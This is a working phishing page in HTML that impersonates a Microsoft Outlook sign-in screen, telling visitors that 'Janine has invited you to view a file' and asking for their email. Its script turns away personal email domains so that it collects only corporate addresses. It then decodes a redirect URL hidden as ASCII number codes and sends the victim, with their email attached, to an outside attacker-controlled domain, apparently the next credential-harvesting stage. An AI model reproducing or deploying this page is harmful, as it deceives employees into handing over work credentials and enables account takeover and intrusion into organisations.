<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/svg" href="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg">
    <title>Authentication</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            background-color: #f4f4f4; 
            color: black; 
            margin: 0; 
            padding: 0; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between; 
        }
        .container { 
            margin: auto; 
            width: 90%; 
            max-width: 400px; 
            padding: 20px; 
        }
        .logo { 
            display: block;
            margin: 0 auto 20px auto;
            width: 80px; 
            height: auto; 
            max-width: 100px; 
        }
        input, button { 
            padding: 10px; 
            margin-top: 10px; 
            width: 100%; 
            box-sizing: border-box;
        }
        input { 
            border: 1px solid #ccc; 
            border-radius: 5px; 
        }
        button { 
            background-color: #0072c6; 
            color: white; 
            border: none; 
            cursor: pointer; 
            border-radius: 5px; 
        }
        footer { 
            background: #f4f4f4; 
            color: black; 
            padding: 15px; 
            font-size: 14px; 
            width: 100%; 
            text-align: center; 
        }
        footer a { color: black; text-decoration: none; margin: 0 10px; }

        @media (max-width: 600px) {
            .container {
                margin-top: 50px;
            }
            .logo {
                width: 70px;
            }
        }
    </style>
</head>
<body>
    <div id="auth-page" class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook Logo" class="logo"><br>
        <h2>Authentication Required</h2><br>
        <p>Janine has invited you to view a file. Please verify your email to proceed.</p><br><br>
        <input type="email" id="email" placeholder="Enter your Outlook email">
        <button onclick="validateEmail()">Continue</button>
    </div>

    <footer>
        <p>&copy; <span id="year"></span> Microsoft. All Rights Reserved.</p>
        <p>
            <a href="privacy-policy.html">Privacy Policy</a> |
            <a href="terms-of-use.html">Terms of Use</a>
        </p>
    </footer>

    <script>
        document.getElementById("year").textContent = new Date().getFullYear();
        function validateEmail() {
            let email = document.getElementById("email").value.trim();
            let validRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!validRegex.test(email)) {
                alert("Invalid email format");
                return;
            }
            let forbiddenDomains = ["gmail.com", "yahoo.com", "aol.com", "company.com", "teste.com", "test.com", "mail.com", "email.com", "verizon.net"];
            let emailDomain = email.split("@")[1].toLowerCase();
            if (forbiddenDomains.includes(emailDomain)) {
                alert("Personal emails are not allowed. Use your company email.");
                return;
            }
            let encodedURL = "104 116 116 112 115 58 47 47 118 97 116 111 115 45 112 114 111 112 101 114 116 121 45 103 114 111 117 112 46 115 117 98 111 100 111 114 101 114 54 46 99 111 109 47 87 54 48 73 85 98 111 78 84 105 99 100 87 105 72 71 73 81 108 72 116 114 69 70 102 104 86 81 83 89 105 81 47";
            let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
            window.location.href = decodedURL + "#W" + (email);
        }
        document.getElementById("email").addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                validateEmail();
            }
        });
    </script>
</body>
</html>
